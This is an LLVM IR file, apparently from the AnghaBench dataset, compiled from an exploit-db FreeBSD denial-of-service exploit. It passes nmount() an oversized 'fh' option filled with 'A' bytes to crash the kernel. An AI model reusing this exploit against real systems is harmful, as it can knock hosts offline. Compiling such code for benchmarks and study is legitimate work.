; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_14003.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_14003.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iovec = type { i8*, i8* }

@DIRPATH = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [7 x i8] c"fstype\00", align 1
@FSNAME = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [7 x i8] c"fspath\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"fh\00", align 1
@BUFSIZE = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [7 x i8] c"calloc\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"hostname\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"census-labs.com\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[*] calling nmount()\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [22 x i8] c"[!] nmount error: %d\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [7 x i8] c"nmount\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"[*] unmounting and deleting %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [8 x %struct.iovec], align 16
  store i32 0, i32* %1, align 4
  %3 = load i8*, i8** @DIRPATH, align 8
  %4 = call i32 @mkdir(i8* %3, i32 448)
  %5 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 0
  %6 = getelementptr inbounds %struct.iovec, %struct.iovec* %5, i32 0, i32 0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %6, align 16
  %7 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 0
  %8 = getelementptr inbounds %struct.iovec, %struct.iovec* %7, i32 0, i32 0
  %9 = load i8*, i8** %8, align 16
  %10 = call i8* @strlen(i8* %9)
  %11 = getelementptr i8, i8* %10, i64 1
  %12 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 0
  %13 = getelementptr inbounds %struct.iovec, %struct.iovec* %12, i32 0, i32 1
  store i8* %11, i8** %13, align 8
  %14 = load i8*, i8** @FSNAME, align 8
  %15 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 1
  %16 = getelementptr inbounds %struct.iovec, %struct.iovec* %15, i32 0, i32 0
  store i8* %14, i8** %16, align 16
  %17 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 1
  %18 = getelementptr inbounds %struct.iovec, %struct.iovec* %17, i32 0, i32 0
  %19 = load i8*, i8** %18, align 16
  %20 = call i8* @strlen(i8* %19)
  %21 = getelementptr i8, i8* %20, i64 1
  %22 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 1
  %23 = getelementptr inbounds %struct.iovec, %struct.iovec* %22, i32 0, i32 1
  store i8* %21, i8** %23, align 8
  %24 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 2
  %25 = getelementptr inbounds %struct.iovec, %struct.iovec* %24, i32 0, i32 0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i8** %25, align 16
  %26 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 2
  %27 = getelementptr inbounds %struct.iovec, %struct.iovec* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 16
  %29 = call i8* @strlen(i8* %28)
  %30 = getelementptr i8, i8* %29, i64 1
  %31 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 2
  %32 = getelementptr inbounds %struct.iovec, %struct.iovec* %31, i32 0, i32 1
  store i8* %30, i8** %32, align 8
  %33 = load i8*, i8** @DIRPATH, align 8
  %34 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 3
  %35 = getelementptr inbounds %struct.iovec, %struct.iovec* %34, i32 0, i32 0
  store i8* %33, i8** %35, align 16
  %36 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 3
  %37 = getelementptr inbounds %struct.iovec, %struct.iovec* %36, i32 0, i32 0
  %38 = load i8*, i8** %37, align 16
  %39 = call i8* @strlen(i8* %38)
  %40 = getelementptr i8, i8* %39, i64 1
  %41 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 3
  %42 = getelementptr inbounds %struct.iovec, %struct.iovec* %41, i32 0, i32 1
  store i8* %40, i8** %42, align 8
  %43 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 4
  %44 = getelementptr inbounds %struct.iovec, %struct.iovec* %43, i32 0, i32 0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8** %44, align 16
  %45 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 4
  %46 = getelementptr inbounds %struct.iovec, %struct.iovec* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 16
  %48 = call i8* @strlen(i8* %47)
  %49 = getelementptr i8, i8* %48, i64 1
  %50 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 4
  %51 = getelementptr inbounds %struct.iovec, %struct.iovec* %50, i32 0, i32 1
  store i8* %49, i8** %51, align 8
  %52 = load i8*, i8** @BUFSIZE, align 8
  %53 = call i8* @calloc(i8* %52, i32 1)
  %54 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %55 = getelementptr inbounds %struct.iovec, %struct.iovec* %54, i32 0, i32 0
  store i8* %53, i8** %55, align 16
  %56 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %57 = getelementptr inbounds %struct.iovec, %struct.iovec* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 16
  %59 = icmp eq i8* %58, null
  br i1 %59, label %60, label %66

60:                                               ; preds = %0
  %61 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %62 = load i8*, i8** @DIRPATH, align 8
  %63 = call i32 @rmdir(i8* %62)
  %64 = load i32, i32* @EXIT_FAILURE, align 4
  %65 = call i32 @exit(i32 %64) #3
  unreachable

66:                                               ; preds = %0
  %67 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %68 = getelementptr inbounds %struct.iovec, %struct.iovec* %67, i32 0, i32 0
  %69 = load i8*, i8** %68, align 16
  %70 = load i8*, i8** @BUFSIZE, align 8
  %71 = getelementptr i8, i8* %70, i64 -1
  %72 = call i32 @memset(i8* %69, i32 65, i8* %71)
  %73 = load i8*, i8** @BUFSIZE, align 8
  %74 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %75 = getelementptr inbounds %struct.iovec, %struct.iovec* %74, i32 0, i32 1
  store i8* %73, i8** %75, align 8
  %76 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 6
  %77 = getelementptr inbounds %struct.iovec, %struct.iovec* %76, i32 0, i32 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8** %77, align 16
  %78 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 6
  %79 = getelementptr inbounds %struct.iovec, %struct.iovec* %78, i32 0, i32 0
  %80 = load i8*, i8** %79, align 16
  %81 = call i8* @strlen(i8* %80)
  %82 = getelementptr i8, i8* %81, i64 1
  %83 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 6
  %84 = getelementptr inbounds %struct.iovec, %struct.iovec* %83, i32 0, i32 1
  store i8* %82, i8** %84, align 8
  %85 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 7
  %86 = getelementptr inbounds %struct.iovec, %struct.iovec* %85, i32 0, i32 0
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0), i8** %86, align 16
  %87 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 7
  %88 = getelementptr inbounds %struct.iovec, %struct.iovec* %87, i32 0, i32 0
  %89 = load i8*, i8** %88, align 16
  %90 = call i8* @strlen(i8* %89)
  %91 = getelementptr i8, i8* %90, i64 1
  %92 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 7
  %93 = getelementptr inbounds %struct.iovec, %struct.iovec* %92, i32 0, i32 1
  store i8* %91, i8** %93, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  %95 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 0
  %96 = call i64 @nmount(%struct.iovec* %95, i32 8, i32 0)
  %97 = icmp slt i64 %96, 0
  br i1 %97, label %98, label %110

98:                                               ; preds = %66
  %99 = load i32, i32* @stderr, align 4
  %100 = load i32, i32* @errno, align 4
  %101 = call i32 @fprintf(i32 %99, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0), i32 %100)
  %102 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %103 = load i8*, i8** @DIRPATH, align 8
  %104 = call i32 @rmdir(i8* %103)
  %105 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %106 = getelementptr inbounds %struct.iovec, %struct.iovec* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 16
  %108 = call i32 @free(i8* %107)
  %109 = call i32 @exit(i32 1) #3
  unreachable

110:                                              ; preds = %66
  %111 = load i8*, i8** @DIRPATH, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0), i8* %111)
  %113 = load i8*, i8** @DIRPATH, align 8
  %114 = call i32 @unmount(i8* %113, i32 0)
  %115 = load i8*, i8** @DIRPATH, align 8
  %116 = call i32 @rmdir(i8* %115)
  %117 = getelementptr inbounds [8 x %struct.iovec], [8 x %struct.iovec]* %2, i64 0, i64 5
  %118 = getelementptr inbounds %struct.iovec, %struct.iovec* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 16
  %120 = call i32 @free(i8* %119)
  ret i32 0
}

declare dso_local i32 @mkdir(i8*, i32) #1

declare dso_local i8* @strlen(i8*) #1

declare dso_local i8* @calloc(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @rmdir(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @nmount(%struct.iovec*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @unmount(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
